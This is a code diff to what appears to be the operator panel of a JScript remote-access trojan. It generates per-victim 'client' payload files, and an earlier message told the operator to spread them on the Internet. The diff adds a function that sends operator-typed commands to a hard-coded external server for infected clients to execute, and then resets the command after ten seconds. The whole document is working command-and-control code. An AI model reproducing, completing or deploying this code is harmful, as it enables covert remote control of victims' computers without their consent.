@@ -33,6 +33,12 @@
 		var fs = WScript.CreateObject("Scripting.FileSystemObject");
 		var shell = WScript.CreateObject("WScript.Shell");
 		
+		function sendtext(fn, data){
+			var xmlhttp = WScript.CreateObject("Microsoft.XMLHTTP");
+			xmlhttp.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/getfile.php?fn=" + fn + "&data=" + data, false);
+			xmlhttp.Send();
+		}
+		
 		function mkpayload(){
 			var txt = fs.OpenTextFile("client.js").ReadAll();
 			
@@ -40,15 +46,19 @@
 			pl.Write(txt.replaceAll("USER_ID", id.value));
 			pl.Close();
 			
-			shell.Run("sendtext.js " + id.value + ".txt null");
+			sendtext(id.value + ".txt", "null");
 			
-			WScript.Echo("Файл " + "client" + id.value + ".js" + " создан. \nРазошлите его в Интернете.");
+			WScript.Echo("Файл " + "client" + id.value + ".js" + " создан.");
 		}
 		
 		function enteraddr(){
 			var addr = prompt("Введите команду для выполнения:", "null");
-			shell.Run("sendtext.js " + id.value + ".txt " + addr);
+			sendtext(id.value + ".txt", addr);
 			WScript.Echo("Команда отправлена. Она будет выполнена в течении 1 - 10 сек.");
+			setTimeout(function(){
+				sendtext(id.value + ".txt", "null");
+				WScript.Echo("Команда выполнена.");
+			}, 10000);
 		}
 	</script>
 </body>
